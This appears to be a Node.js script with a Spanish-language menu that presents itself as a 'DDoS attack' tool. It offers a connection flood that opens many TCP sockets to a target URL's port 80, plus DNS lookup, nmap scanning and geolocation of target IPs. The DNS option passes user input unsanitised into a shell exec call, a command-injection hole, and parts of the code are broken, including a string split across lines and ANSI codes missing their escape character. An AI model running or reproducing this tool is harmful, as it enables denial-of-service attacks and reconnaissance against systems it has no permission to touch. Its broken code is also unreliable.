const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const colors = {
  reset: '[0m',
  bright: '[1m',
  dim: '[2m',
  underscore: '[4m',
  blink: '[5m',
  reverse: '[7m',
  hidden: '[8m',
  fg: {
    black: '[30m',
    red: '[31m',
    green: '[32m',
    yellow: '[33m',
    blue: '[34m',
    magenta: '[35m',
    cyan: '[36m',
    white: '[37m',
  },
  bg: {
    black: '[40m',
    red: '[41m',
    green: '[42m',
    yellow: '[43m',
    blue: '[44m',
    magenta: '[45m',
    cyan: '[46m',
    white: '[47m',
  }
};

const decorations = {
  underline: '[4m',
  bold: '[1m',
  italic: '[3m',
};

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[36m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[31m Conectado a ${url}`);
});
socket.on('data', (data) => {
console.log(`Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[36m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[36m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};

const getInfo = async (ip) => {
try {
const exec = require('child_process').exec;
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(` ${key.trim()}: ${value.trim()}`);
}
}
console.log(details.join(String.raw`
`));
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};

const analyzeIP = async (ip) => {
try {
const nmap = require('nmap');
const scanner = new nmap.Scanner(ip);
scanner.on('complete', (data) => {
const details = [];
for (const item of data.hosts) {
details.push(`Host: ${item.ip}`);
details.push(`OS: ${item.os}`);
details.push(`Ports: ${item.ports}`);
}
console.log(details.join('
'));
});
scanner.scan();
} catch (error) {
console.error(`Error: ${error.message}`);
}
};

const getGeoIP = async (ip) => {
try {
const geoip = require('geoip-lite');
const geo = geoip.lookup(ip);
if (geo) {
console.log(`País: ${geo.country}`);
console.log(`Región: ${geo.region}`);
console.log(`Ciudad: ${geo.city}`);
} else {
console.log('No se encontró información geográfica para esa IP');
}
} catch (error) {
console.error(`Error: ${error.message}`);
}
};

const showMenu = () => {
console.clear();
console.log('[31m         DDoS attack    ');
console.log('⭐️ Desarrollado por Keiji821');
console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
console.log('[34m ︳2. Actualizar código                  ︳');
console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
console.log('[31m ︳5. Sacar información de IP            ︳');
console.log('[31m ︳6. Análisis de IP                     ︳');
console.log('[31m ︳7. Información geográfica de IP       ︳');
console.log('[31m ︳8. Salir                              ︳');
console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎺⸍');
rl.setPrompt('[37m  🌐➤ ');
rl.prompt();
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

showMenu(); // Mostrar el menú principal al inicio

rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas: ');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos):>');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('Ingrese la IP para obtener información: ');
rl.question('IP: ', (ip) => {
if (ip === '') {
console.log('IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('Ingrese la IP para análisis: ');
rl.question('IP: ', (ip) => {
if (ip === '') {
console.log('IP invalida');
showMenu();
} else {
analyzeIP(ip);
showMenu();
}
});
break;
case '7':
console.log('Ingrese la IP para obtener información geográfica: ');
rl.question('IP: ', (ip) => {
if (ip === '') {
console.log('IP invalida');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '8':
console.log('Saliendo...');
process.exit();
break;
}
}).on('close', () => {
process.exit();
});